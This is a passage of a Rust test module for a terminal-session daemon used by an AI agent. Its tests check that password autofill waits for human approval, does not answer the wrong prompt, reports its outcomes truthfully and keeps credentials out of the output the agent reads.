            let (hit, _) = armed_session(&server, &hit_gate, "ssh", &["user@prod-01"]).await;

            buffer_until(&hit, b"got=HUNTER2", 20).await;
            assert!(
                sc.ran("prod-ssh"),
                "`secret_provider = {mode:?}` allows the keychain step and it did \
                 not run"
            );
            assert_eq!(
                sc.kinds(&hit.id),
                vec!["binding_resolved".to_string()],
                "the matching session did not autofill under {mode:?}"
            );

            // The binding negative: a session no binding names.
            assert!(
                !contains(&buffered(&miss), b"got="),
                "a session no binding names received a value under {mode:?}"
            );
            assert!(
                miss.is_awaiting_secret(),
                "the unmatched session is no longer blocked at its prompt"
            );
            assert!(
                server
                    .attach_hub()
                    .secrets()
                    .matches_outstanding(&miss.id, &miss_raised.request_id),
                "the unmatched session's request was closed by something"
            );
            assert!(
                sc.kinds(&miss.id).is_empty(),
                "the unmatched session produced audit lines: {:?}",
                sc.kinds(&miss.id)
            );

            let _ = hit.signal(Signal::Kill);
            let _ = miss.signal(Signal::Kill);
        }
    }

    /// **Autofill is not "skip every gate".**
    ///
    /// §9.6's `require_confirm` keeps a human in the loop, and it applies
    /// on this path exactly as it does to a tool call: the daemon
    /// broadcasts `BindingApprovalRequired`, nothing is resolved and
    /// nothing is injected until somebody approves. Treating the knob as
    /// blanket permission is precisely the silent injection REQ-SEC-014's
    /// default is protecting against.
    ///
    /// **The approval frame is the clock** for the "nothing yet" half:
    /// it exists only after step 1 has run and chosen to ask, so the
    /// negatives beside it are statements about a decision that has
    /// already been taken rather than about elapsed time.
    ///
    /// With no caller there is no deadline to halve, so §17.5's configured
    /// `binding_approval_timeout_secs` applies in full — asserted through
    /// the approval's own `expires_at_unix_secs`.
    #[tokio::test]
    async fn autofill_with_require_confirm_still_asks() {
        let mut sc = Scratch::new("autofillconfirm");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let server = server_full(
            autofill_mode(vec![b], true),
            &sc.audit_log(),
            30,
            Clock::system(),
        );

        let gate = sc.path("gate");
        let s = session_running("ssh", &["prod-01"], &gated_echo_off(&gate));
        server.registry.insert(Arc::clone(&s)).expect("register");
        server.watch_for_autofill(&s);
        let mut client = attach_fake(&server, &s.id);
        let (raised, first) = server.attach_hub().raise_secret(&s.id, "Password: ");
        assert!(first);
        std::fs::write(&gate, b"go").expect("open the gate");
        await_prompt(&s, b"Password: ").await;

        let approval = await_approval(&server, &s.id).await;
        let frame = client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        let ServerFrame::BindingApprovalRequired {
            binding_name,
            provider,
            ..
        } = frame
        else {
            panic!("wait_for returned the wrong frame");
        };
        assert_eq!(binding_name, sc.name("prod-ssh"));
        assert_eq!(provider, "pass");

        // Nothing has been resolved, nothing injected, nothing spent.
        assert!(
            !sc.ran("prod-ssh"),
            "the provider ran before anybody approved — the reference was read out \
             of a store nobody agreed to read"
        );
        assert!(
            !contains(&buffered(&s), b"got="),
            "a value was injected before the approval was answered"
        );
        assert!(
            sc.kinds(&s.id).is_empty(),
            "an unanswered approval wrote an audit line: {:?}",
            sc.kinds(&s.id)
        );
        assert!(
            server
                .attach_hub()
                .secrets()
                .matches_outstanding(&s.id, &raised.request_id),
            "the raise was closed while the approval was still pending"
        );

        // §17.5 with no caller: the configured window applies in full,
        // rather than half of a deadline that does not exist.
        let now = server.clock.now_ms().max(0) as u64 / 1000;
        assert!(
            approval.expires_at_unix_secs >= now + 25,
            "the caller-less window was halved: expires at {} against now {now}",
            approval.expires_at_unix_secs
        );

        // **And the pairing**: approving releases it.
        assert_eq!(
            decide(
                &server,
                &s.id,
                &approval.approval_id,
                ApprovalDecision::Approve,
                "ui-bridge"
            ),
            crate::secret::Decide::Recorded
        );
        buffer_until(&s, b"got=HUNTER2", 20).await;
        assert!(sc.ran("prod-ssh"), "the approved provider never ran");
        assert_eq!(
            approval_line(&sc, &s.id).expect("an approved decision writes a line")["outcome"],
            "approved"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// [`ECHO_OFF_FIXTURE`] with its trailing print replaced, so the
    /// child is **silent** from the moment it restores echo.
    ///
    /// **The silence is the subject, not a detail.** `is_awaiting_secret`
    /// is an `AtomicBool` whose only writer is the reader thread, and that
    /// loop runs only when a chunk arrives — so a child that leaves its
    /// echo-off read and prints nothing leaves the flag reading `true` for
    /// an unbounded time. A fixture that prints between its two reads
    /// refreshes the flag and hides exactly that.
    ///
    /// A replacement, not a second spelling: GC14's one fixture is the
    /// input and the substitution is asserted to have hit, the same idiom
    /// [`echo_off_prompting`] uses.
    fn echo_off_then(tail: &str) -> String {
        let out = ECHO_OFF_FIXTURE.replace(
            "read x; stty echo; printf 'got=%s\\n' \"$(printf %s \"$x\" | tr a-z A-Z)\"",
            tail,
        );
        assert_ne!(out, ECHO_OFF_FIXTURE, "the tail substitution missed");
        out
    }

    /// [`ECHO_OFF_FIXTURE`] with its read replaced by a gate: echo goes
    /// off, the prompt is drawn, and the child holds there until the row
    /// opens `leave` — then restores echo and blocks on an **echoing**
    /// read, having printed nothing in between.
    ///
    /// **The gate is what makes the edge reliable.** §8.3's classification
    /// is sampled by the reader thread when a chunk arrives, so a child
    /// that gives echo back in the microseconds after printing its prompt
    /// can be past it before the reader ever looks — measured: 4 failures
    /// in 8 loaded runs of an ungated version, as *"the provider for
    /// `prod-ssh` never started"*, because no `AwaitingSecretEntered` edge
    /// ever fired. Holding echo off until the row has seen the provider
    /// start turns that into an arrangement.
    fn echo_off_then_silently_leaves(leave: &Path) -> String {
        echo_off_then(&format!(
            "until [ -f '{}' ]; do sleep 1; done; stty echo; read y; \
             printf 'next=[%s]\\n' \"$y\"",
            leave.display()
        ))
    }

    /// Poll the **live** line discipline until echo is back on.
    ///
    /// `is_awaiting_secret()` cannot be used for this and that is the
    /// point of the rows below: it is a cache the reader thread refreshes
    /// only when the child produces output.
    async fn await_echo_on(s: &Session) {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        while s.line_discipline().echo != Some(true) {
            assert!(
                tokio::time::Instant::now() < deadline,
                "the child never restored echo"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    /// **C-1: unattached, the credential must not go into a child that has
    /// already left the read it was resolved for — even when nothing has
    /// told the daemon so.**
    ///
    /// Everything GH #35 added observes `SecretSlots`, and with **nobody
    /// attached there is no raise at all**, so nothing ticks. The first
    /// fix for this asked `session.is_awaiting_secret()` before the write
    /// and **did not close it**: that flag is a cache the reader thread
    /// refreshes only when a chunk arrives, so a child that restores echo
    /// and then prints nothing leaves it reading `true` indefinitely. The
    /// bound was never "microseconds"; it was "until the child's next
    /// output byte".
    ///
    /// This row is arranged so that **no route the daemon can observe**
    /// fires: the child abandons its own echo-off read (`read x
    /// < /dev/null`, which returns at once on EOF), so no `send_input`,
    /// no human, no slot and no write counter move at all. It then
    /// restores echo and blocks on an **echoing** read in silence. The
    /// row asserts the cache is still `true` at the moment of the write,
    /// which is what makes it a statement about staleness rather than
    /// about anything else.
    ///
    /// Before the writer-thread check, the credential landed in that
    /// second read, where the line discipline echoed it into the ring
    /// buffer that `read_output` serves to the agent.
    ///
    /// **The pairing is the same arrangement with the child staying put**,
    /// where the autofill does write — without it, `!contains("hunter2")`
    /// passes against an autofill that stopped writing at all.
    #[tokio::test]
    async fn an_unattached_autofill_does_not_write_into_a_child_that_moved_on() {
        // ---- the child leaves its read with nothing observable happening
        let mut sc = Scratch::new("movedon");
        let child_gate = sc.path("child.gate");
        let gate = sc.path("gate");
        let b = sc.binding(
            "prod-ssh",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
        // `read x < /dev/null` takes the echo-off read off the tty
        // entirely: it returns at once and **nothing is written to this
        // child by anybody**. Then echo comes back and the child blocks on
        // an echoing read, in silence.
        let child = format!(
            "until [ -f '{}' ]; do sleep 1; done; {}",
            child_gate.display(),
            echo_off_then_silently_leaves(&sc.path("leave.gate"))
        );
        let s = session_running("ssh", &["prod-01"], &child);
        server.registry.insert(Arc::clone(&s)).expect("register");
        server.watch_for_autofill(&s);
        // **Nobody attached, and nothing raised** — with a raise, the
        // closure count would refuse this for a different reason and mask
        // the one under test.
        assert!(
            server.attach_hub().outstanding_secret(&s.id).is_none(),
            "a raise would tick the closure count and mask this row"
        );
        std::fs::write(&child_gate, b"go").expect("release the child");
        await_prompt(&s, b"Password: ").await;
        // The provider has started and is blocked on its own gate, so
        // everything below is strictly inside the autofill's window.
        await_ran(&sc, "prod-ssh").await;
        // Only now does the child give echo back — **inside** the
        // provider's window, silently, with nothing written to it by
        // anybody. Holding it until the provider has provably started is
        // what makes the `AwaitingSecretEntered` edge an arrangement
        // rather than a race with the reader thread's sampling.
        std::fs::write(sc.path("leave.gate"), b"go").expect("release the child");
        // Read from the **tty**, not from the cache.
        await_echo_on(&s).await;
        // **And the cache still says otherwise.** This is the row's whole
        // subject: without it, a future implementation that freshened the
        // flag would make the row green while leaving the class open.
        assert!(
            s.is_awaiting_secret(),
            "the cached flag was refreshed, so this row is no longer about staleness"
        );
        let writes_before = s.writes_performed();

        std::fs::write(&gate, b"go").expect("open the gate");

        // **The clock, and it is a positive rather than a sleep.**
        // `binding_resolved` is written the moment the provider produces a
        // value, so its arrival says the decision has been taken. Then the
        // child's echoing read is answered with a sentinel: had the
        // credential been written, the child would have consumed it and
        // printed `next=[hunter2]`, and this sentinel would be the
        // leftover instead.
        await_audit_kind(&sc, &s.id, "binding_resolved").await;
        assert_eq!(
            s.writes_performed(),
            writes_before,
            "something wrote to this child, so the decline below could be the write \
             counter's doing rather than the echo state's"
        );
        call_send_input(&server, &s.id, "nextline").await;
        let seen = buffer_until(&s, b"next=[", 20).await;
        assert!(
            contains(&seen, b"next=[nextline]"),
            "the child's echoing read was answered by something other than the \
             sentinel:\n{}",
            String::from_utf8_lossy(&seen)
        );
        assert!(
            !contains(&seen, PROBE.as_bytes()),
            "the resolved credential was written into an echoing read and is in the \
             ring buffer, which is what `read_output` serves to the agent:\n{}",
            String::from_utf8_lossy(&seen)
        );
        let _ = s.signal(Signal::Kill);

        // ---- the pairing: the child stays at its echo-off read, and the
        // autofill does write
        let mut sc2 = Scratch::new("movedon-control");
        let b2 = sc2.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        let server2 = server_with(autofill_mode(vec![b2], true), &sc2.audit_log());
        let gate2 = sc2.path("gate");
        let s2 = session_running("ssh", &["prod-01"], &gated_echo_off(&gate2));
        server2.registry.insert(Arc::clone(&s2)).expect("register");
        server2.watch_for_autofill(&s2);
        std::fs::write(&gate2, b"go").expect("open the gate");
        await_prompt(&s2, b"Password: ").await;
        let seen2 = buffer_until(&s2, b"got=HUNTER2", 20).await;
        assert!(
            !contains(&seen2, PROBE.as_bytes()),
            "echo was off, so the value must not be in the buffer:\n{}",
            String::from_utf8_lossy(&seen2)
        );
        let _ = s2.signal(Signal::Kill);
    }

    /// **The second interleaving, and no freshness fix reaches it.**
    ///
    /// `Input` and `Secret` share one bounded FIFO. A `send_input` — which
    /// §5.2 permits during `AwaitingSecret` (REQ-SEC-011), with a warning
    /// — satisfies the echo-off read the credential was resolved for, and
    /// the credential then answers the child's **next** read. Here the
    /// predicate is not stale and is not wrong: the state changes because
    /// of bytes already in flight in the queue the credential is about to
    /// join, so a check taken before the enqueue cannot see it however
    /// fresh it is.
    ///
    /// **The child's second read is also echo-off**, which is a real
    /// shape — `read pass; read confirm` — and is what isolates this
    /// condition: the echo test would *not* have refused this write, so a
    /// decline here is the write counter's doing and nothing else. The row
    /// asserts that, both ways.
    ///
    /// The harm is not an echo into the buffer but the credential
    /// answering the **wrong read**, which `next=[…]` reports.
    #[tokio::test]
    async fn a_write_that_answered_the_prompt_first_declines_the_credential() {
        let mut sc = Scratch::new("intervened");
        let child_gate = sc.path("child.gate");
        let gate = sc.path("gate");
        let b = sc.binding(
            "prod-ssh",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
        // Two echo-off reads, then the report. `stty echo` moves after the
        // second read, so echo is **still off** when the credential would
        // be written.
        let child = format!(
            "until [ -f '{}' ]; do sleep 1; done; {}",
            child_gate.display(),
            echo_off_then("read x; read y; stty echo; printf 'next=[%s]\\n' \"$y\"")
        );
        let s = session_running("ssh", &["prod-01"], &child);
        server.registry.insert(Arc::clone(&s)).expect("register");
        server.watch_for_autofill(&s);
        assert!(
            server.attach_hub().outstanding_secret(&s.id).is_none(),
            "a raise would tick the closure count and mask this row"
        );
        std::fs::write(&child_gate, b"go").expect("release the child");
        await_prompt(&s, b"Password: ").await;
        await_ran(&sc, "prod-ssh").await;

        // The route §5.2 permits, inside the provider window. Its bytes
        // reach the PTY before the credential's do, so they answer the
        // read the credential was resolved for.
        let warned = call_send_input(&server, &s.id, "typedbyahuman").await;
        assert_eq!(
            warned["data"]["warning"], "session_awaiting_secret",
            "REQ-SEC-011's warning is what makes this a route the daemon knows \
             about: {warned}"
        );
        // **The isolation, asserted rather than assumed**: the child is
        // still at an echo-off read, so the echo condition cannot be what
        // refuses the write below.
        assert_eq!(
            s.line_discipline().echo,
            Some(false),
            "echo came back, so this row is the echo condition's and not the write \
             counter's"
        );

        std::fs::write(&gate, b"go").expect("open the gate");
        await_audit_kind(&sc, &s.id, "binding_resolved").await;

        // Same clock as the row above: the sentinel is what the child's
        // second read must have received.
        call_send_input(&server, &s.id, "nextline").await;
        let seen = buffer_until(&s, b"next=[", 20).await;
        assert!(
            contains(&seen, b"next=[nextline]"),
            "the credential answered the child's second read:\n{}",
            String::from_utf8_lossy(&seen)
        );
        let _ = s.signal(Signal::Kill);
    }

    /// **A write the writer declines closes the request `cancelled`, not
    /// `fulfilled`.**
    ///
    /// The slot has to be taken before the write — two answers to one
    /// prompt must produce one write — but the *word* must not, and moving
    /// the decision into the writer is what made that reachable: a
    /// declined write would otherwise have told every attached client
    /// `fulfilled` for a value the child never received, which is a lie a
    /// human acts on.
    ///
    /// A raise with **no** forwarder, so nothing else closes it: this row
    /// is about which word the autofill itself sends.
    #[tokio::test]
    async fn a_declined_write_closes_the_request_cancelled_rather_than_fulfilled() {
        let mut sc = Scratch::new("declinedword");
        let child_gate = sc.path("child.gate");
        let gate = sc.path("gate");
        let b = sc.binding(
            "prod-ssh",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
        let child = format!(
            "until [ -f '{}' ]; do sleep 1; done; {}",
            child_gate.display(),
            echo_off_then_silently_leaves(&sc.path("leave.gate"))
        );
        let s = session_running("ssh", &["prod-01"], &child);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        server.watch_for_autofill(&s);
        // The raise a connection makes on the edge, arranged before it so
        // the row measures the closure word rather than racing the raise.
        let (raised, first) = server.attach_hub().raise_secret(&s.id, "Password: ");
        assert!(first, "the row, not something else, raised this request");
        std::fs::write(&child_gate, b"go").expect("release the child");
        await_prompt(&s, b"Password: ").await;
        await_ran(&sc, "prod-ssh").await;
        std::fs::write(sc.path("leave.gate"), b"go").expect("release the child");
        await_echo_on(&s).await;
        std::fs::write(&gate, b"go").expect("open the gate");

        let closed = client
            .wait_for("SecretRequestClosed", |f| {
                matches!(f, ServerFrame::SecretRequestClosed { .. })
            })
            .await;
        let ServerFrame::SecretRequestClosed {
            request_id,
            outcome,
        } = closed
        else {
            panic!("wait_for returned the wrong frame");
        };
        assert_eq!(request_id, raised.request_id);
        assert_eq!(
            outcome, "cancelled",
            "a declined write told the client the request was fulfilled"
        );
        // And the value really was not written, or the word above is the
        // only thing this row is about.
        assert!(
            !contains(&buffered(&s), PROBE.as_bytes()),
            "the credential reached the ring buffer"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **The closure count, isolated from the two writer-side conditions.**
    ///
    /// GH #35's count and `SecretIfUnread`'s two checks overlap on most
    /// arrangements — a human answering inside the window both closes the
    /// slot *and* bumps the write counter, so either would refuse it. That
    /// overlap is why `a_human_answering_during_the_provider_call_is_not_overwritten`
    /// and `a_raise_answered_inside_the_provider_window_is_not_overwritten`
    /// no longer redden when the count is removed: the writer catches
    /// them. Measured, and this row is the answer.
    ///
    /// Here the slot changes with **no write and no echo change**: the
    /// outstanding request is closed and a second raised in its place —
    /// the two calls `attach::conn`'s `AwaitingSecretLeft` and
    /// `AwaitingSecretEntered` arms make when a child finishes one
    /// echo-off read and starts another. The child is on a *second*
    /// echo-off read throughout, so neither writer condition can refuse
    /// this, and the row asserts both of those non-conditions rather than
    /// assuming them.
    ///
    /// The harm is §9.6's own: a value fetched for the first prompt typed
    /// into the second. `sudo` asking twice is the ordinary shape.
    #[tokio::test]
    async fn a_slot_superseded_without_a_write_still_refuses_the_credential() {
        let mut sc = Scratch::new("supersededslot");
        let child_gate = sc.path("child.gate");
        let gate = sc.path("gate");
        let b = sc.binding(
            "prod-ssh",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
        // Two echo-off reads: echo never comes back inside the window.
        let child = format!(
            "until [ -f '{}' ]; do sleep 1; done; {}",
            child_gate.display(),
            echo_off_then("read x; read y; stty echo; printf 'next=[%s]\\n' \"$y\"")
        );
        let s = session_running("ssh", &["prod-01"], &child);
        server.registry.insert(Arc::clone(&s)).expect("register");
        server.watch_for_autofill(&s);
        let (first, raised) = server.attach_hub().raise_secret(&s.id, "Password: ");
        assert!(raised, "the row, not something else, raised this request");
        std::fs::write(&child_gate, b"go").expect("release the child");
        await_prompt(&s, b"Password: ").await;
        await_ran(&sc, "prod-ssh").await;
        let writes_before = s.writes_performed();

        // The two calls `forward_events` makes when one echo-off read ends
        // and the next begins. **No value is written by either.**
        let hub = server.attach_hub();
        let closed = hub
            .close_secret(&s.id, Some(&first.request_id))
            .expect("the raise is still there");
        drop(closed);
        let (second, raised2) = hub.raise_secret(&s.id, "Password: ");
        assert!(raised2 && second.request_id != first.request_id);

        // **The isolation, asserted rather than assumed.** Neither writer
        // condition can be what refuses the write below.
        assert_eq!(
            s.line_discipline().echo,
            Some(false),
            "echo came back, so the echo condition could refuse this"
        );
        assert_eq!(
            s.writes_performed(),
            writes_before,
            "something was written, so the write counter could refuse this"
        );

        std::fs::write(&gate, b"go").expect("open the gate");
        await_audit_kind(&sc, &s.id, "binding_resolved").await;

        // **Two sentinels, because nothing has answered either read.** The
        // first takes the read the credential was resolved for and the
        // second takes the one after it. Had the credential been written it
        // would have taken the first, and the child's report would name
        // `firstline` instead — which is the harm stated as an
        // observation rather than as an absence.
        call_send_input(&server, &s.id, "firstline").await;
        call_send_input(&server, &s.id, "nextline").await;
        let seen = buffer_until(&s, b"next=[", 20).await;
        assert!(
            contains(&seen, b"next=[nextline]"),
            "a value fetched for the first prompt was typed into the second:\n{}",
            String::from_utf8_lossy(&seen)
        );
        // And the second request is untouched — refused, not half-taken.
        assert!(
            hub.secrets().matches_outstanding(&s.id, &second.request_id),
            "the refusal disturbed the request it refused to take"
        );

        let _ = s.signal(Signal::Kill);
    }

    /// **N-1: a genuine `getpass` that §8.3 does not call `AwaitingSecret`
    /// is still answered.**
    ///
    /// The classification is narrower than "echo is off": `Fullscreen`
    /// preempts it when the alternate screen is active
    /// (`detect/detector.rs`), so an echo-off password prompt inside a TUI
    /// is not `AwaitingSecret`. A version of C-1's fix gated the shared
    /// write path on that classification, which silently narrowed
    /// `request_secret_input` — a tool the agent explicitly called, with a
    /// binding that matches and a child genuinely on `getpass` — into
    /// falling through to a human. Fail-closed, but a regression, and
    /// untested in either direction.
    ///
    /// The write path now gates on the **echo state itself**, which is the
    /// condition the harm turns on. This row is the positive direction;
    /// `an_unattached_autofill_does_not_write_into_a_child_that_moved_on`
    /// is the negative, and between them the narrowing is covered rather
    /// than assumed.
    #[tokio::test]
    async fn a_getpass_the_classifier_calls_fullscreen_is_still_answered() {
        let mut sc = Scratch::new("altscreen");
        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
        // The alternate screen, then GC14's fixture verbatim.
        let child = format!("printf '\\033[?1049h'; {ECHO_OFF_FIXTURE}");
        let s = session_running("ssh", &["prod-01"], &child);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        // **The premise, asserted.** Without this the row is just another
        // positive control and says nothing about the narrowing.
        assert_eq!(
            s.line_discipline().echo,
            Some(false),
            "the child is not actually on an echo-off read"
        );
        // **Polled, not sampled.** The ring buffer and the detector's
        // mode tracker are fed on the same reader path and not in the same
        // instant — measured under load, `await_prompt` returned with
        // `Password: ` in the ring while the tracker had not yet seen the
        // `?1049h` that precedes it, and the row failed asserting
        // `AwaitingSecret != AwaitingSecret`. It is the same flake shape
        // `await_detected_prompt` exists for one rung down. A *positive*
        // wait, so a tree in which the alternate screen stopped preempting
        // fails with what it saw rather than hanging.
        let mode = crate::detect::InteractionMode::Fullscreen;
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        while s.detection().interaction_mode != mode {
            assert!(
                tokio::time::Instant::now() < deadline,
                "the alternate screen never preempted the echo rung; the classifier \
                 says {:?}, so this row is not about the narrowing any more",
                s.detection().interaction_mode
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }

        let payload = call(&server, secret_args(&s.id, 10)).await;
        assert_eq!(
            payload["status"], "secret_provided",
            "a genuine getpass the classifier calls {mode:?} was not answered: {payload}"
        );
        let seen = buffer_until(&s, b"got=HUNTER2", 20).await;
        assert!(
            !contains(&seen, PROBE.as_bytes()),
            "echo was off, so the value must not be in the buffer:\n{}",
            String::from_utf8_lossy(&seen)
        );
        assert_eq!(sc.kinds(&s.id), vec!["binding_resolved".to_string()]);

        let _ = s.signal(Signal::Kill);
    }

    /// `attach::conn::forward_events`' two secret arms, driven off the
    /// **same** `SessionEvent` stream a real connection subscribes to.
    ///
    /// Not the real function — that takes an `Arc<Daemon>`, which this
    /// target does not build — but the same two hub calls in the same two
    /// arms, woken by the same `broadcast::send` that wakes the listener.
    /// That is the point: every other row here raises by hand *before* the
    /// edge, so the two consumers never actually ride one edge.
    ///
    /// `hold` places the raise inside the listener's provider window
    /// deterministically: with `Some(path)` the arm waits for that file
    /// before raising, and `Scratch::binding` makes the provider's marker
    /// its script's first act.
    fn spawn_forwarder(
        server: &HoldfastServer,
        session: &Arc<Session>,
        hold: Option<PathBuf>,
    ) -> tokio::task::JoinHandle<()> {
        let server = server.clone();
        let session = Arc::clone(session);
        let mut events = session.subscribe_events();
        tokio::spawn(async move {
            use crate::session::SessionEvent;
            use tokio::sync::broadcast::error::RecvError;
            loop {
                match events.recv().await {
                    Ok(SessionEvent::AwaitingSecretEntered { prompt_text }) => {
                        if let Some(p) = &hold {
                            while !p.exists() {
                                tokio::time::sleep(Duration::from_millis(10)).await;
                            }
                        }
                        let hub = server.attach_hub();
                        let (req, _first) = hub.raise_secret(&session.id, &prompt_text);
                        hub.broadcast_awaiting_secret(
                            &session.id,
                            &req.request_id,
                            &req.prompt_text,
                        );
                    }
                    // §5.2's supersede: echo came back with no submission.
                    Ok(SessionEvent::AwaitingSecretLeft) => {
                        let hub = server.attach_hub();
                        if let Some(raised) = hub.close_secret(&session.id, None) {
                            let id = raised.request_id().to_string();
                            raised.answer(crate::secret::Resolution::Cancelled(
                                crate::secret::CancelReason::UserCancelled,
                            ));
                            hub.broadcast_secret_closed(&session.id, &id, "cancelled");
                        }
                    }
                    Ok(SessionEvent::Exited { .. }) | Err(RecvError::Closed) => return,
                    Err(RecvError::Lagged(_)) => {}
                }
            }
        })
    }

    /// Poll until this session's slot is empty, or fail.
    async fn await_slot_empty(server: &HoldfastServer, session_id: &str) {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        while server.attach_hub().outstanding_secret(session_id).is_some() {
            assert!(
                tokio::time::Instant::now() < deadline,
                "a raise was left outstanding on {session_id}"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    /// **The listener and a connection's raise on one edge, driven rather
    /// than argued.**
    ///
    /// Every other autofill row raises by hand *before* the edge, and
    /// `attach_fake` registers an `AttachConn` without running
    /// `forward_events` — so the ordering the design rests on is never
    /// exercised. This project's own constraints say a claim of that shape
    /// must be driven, and this milestone has already had four rows found
    /// decorative or load-dependent by mutation rather than by reading.
    ///
    /// Two halves:
    ///
    /// * **Arranged** — the raise lands *inside* the listener's provider
    ///   window, which is the order the listener's snapshot cannot have
    ///   seen. It must still be taken and closed `fulfilled`, because a
    ///   raise nobody has adopted is this value's to close.
    /// * **Concurrent** — the forwarder raises the instant the edge fires,
    ///   with nothing gated, several times over.
    ///
    /// **The second half does not sample two outcomes, and the claim is
    /// stated accordingly.** A review instrumented it and measured
    /// **24 of 24 passes taking the same branch**; an earlier draft of
    /// this doc called the ordering *"genuinely undecided"*, and that was
    /// not supported by the evidence. The reason is not scheduling luck —
    /// it is that **the two orderings converge by construction**. A raise
    /// closes nothing, so it does not move the closure count, and it
    /// registers no waiter; so a snapshot taken *before* the forwarder's
    /// raise and one taken *after* it are indistinguishable to
    /// `take_if_unadopted_matching`, and both answer `Taken`. There is no
    /// second branch to reach on this arrangement, and a row asserting
    /// otherwise would be waiting for something that cannot happen.
    ///
    /// What the concurrent half is therefore for: the invariant is
    /// evaluated against a **real edge with two real consumers on it**
    /// rather than a hand-raise, several times, which is what the prose it
    /// replaces was asserting without driving. The `cancelled` closure —
    /// the forwarder's `AwaitingSecretLeft` arm — belongs to a *late*
    /// forwarder rather than to an ordering, and
    /// `a_declined_write_closes_the_request_cancelled_rather_than_fulfilled`
    /// is where that word is pinned.
    #[tokio::test]
    async fn the_listener_and_a_connections_raise_ride_the_same_edge() {
        // ---- arranged: the raise lands inside the provider window
        let mut sc = Scratch::new("sameedge");
        let child_gate = sc.path("child.gate");
        let gate = sc.path("gate");
        let b = sc.binding(
            "prod-ssh",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], &gated_echo_off(&child_gate));
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        server.watch_for_autofill(&s);
        let forwarder = spawn_forwarder(&server, &s, Some(sc.marker("prod-ssh")));
        std::fs::write(&child_gate, b"go").expect("release the child");

        await_prompt(&s, b"Password: ").await;
        await_ran(&sc, "prod-ssh").await;
        // The connection's raise, now provably inside the window.
        let raised = client.wait_for("AwaitingSecret", is_awaiting).await;
        let ServerFrame::AwaitingSecret { request_id, .. } = raised else {
            panic!("wait_for returned the wrong frame");
        };
        std::fs::write(&gate, b"go").expect("open the gate");

        let seen = buffer_until(&s, b"got=HUNTER2", 20).await;
        assert_eq!(
            seen.windows(4).filter(|w| *w == b"got=").count(),
            1,
            "the child completed more than one read:\n{}",
            String::from_utf8_lossy(&seen)
        );
        let closed = client
            .wait_for("SecretRequestClosed", |f| {
                matches!(f, ServerFrame::SecretRequestClosed { .. })
            })
            .await;
        let ServerFrame::SecretRequestClosed {
            request_id: closed_id,
            outcome,
        } = closed
        else {
            panic!("wait_for returned the wrong frame");
        };
        assert_eq!(
            (closed_id.as_str(), outcome.as_str()),
            (request_id.as_str(), "fulfilled"),
            "a raise that appeared inside the window is the autofill's to close"
        );
        await_slot_empty(&server, &s.id).await;
        assert_eq!(sc.kinds(&s.id), vec!["binding_resolved".to_string()]);
        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
        let _ = forwarder.await;

        // ---- raced: both consumers on one ungated edge
        let mut fulfilled = 0usize;
        const PASSES: usize = 6;
        for pass in 0..PASSES {
            let mut sc = Scratch::new(&format!("sameedge-race-{pass}"));
            let child_gate = sc.path("child.gate");
            let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
            let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
            let s = session_running("ssh", &["prod-01"], &gated_echo_off(&child_gate));
            server.registry.insert(Arc::clone(&s)).expect("register");
            let mut client = attach_fake(&server, &s.id);
            server.watch_for_autofill(&s);
            let forwarder = spawn_forwarder(&server, &s, None);
            std::fs::write(&child_gate, b"go").expect("release the child");

            let seen = buffer_until(&s, b"got=HUNTER2", 20).await;
            // **The invariant, whichever task tokio polled first** —
            // which, per the doc above, converges on one answer.
            assert_eq!(
                seen.windows(4).filter(|w| *w == b"got=").count(),
                1,
                "pass {pass}: the child completed more than one read:\n{}",
                String::from_utf8_lossy(&seen)
            );
            assert!(
                !contains(&seen, PROBE.as_bytes()),
                "pass {pass}: the value reached the ring buffer:\n{}",
                String::from_utf8_lossy(&seen)
            );
            assert_eq!(
                sc.kinds(&s.id),
                vec!["binding_resolved".to_string()],
                "pass {pass}: the trail is not one resolution"
            );
            // No slot leaks: either the autofill closed the raise, or the
            // forwarder's `AwaitingSecretLeft` arm did when echo came back.
            await_slot_empty(&server, &s.id).await;
            let closed = client
                .wait_for("SecretRequestClosed", |f| {
                    matches!(f, ServerFrame::SecretRequestClosed { .. })
                })
                .await;
            if let ServerFrame::SecretRequestClosed { outcome, .. } = closed {
                if outcome == "fulfilled" {
                    fulfilled += 1;
                }
            }
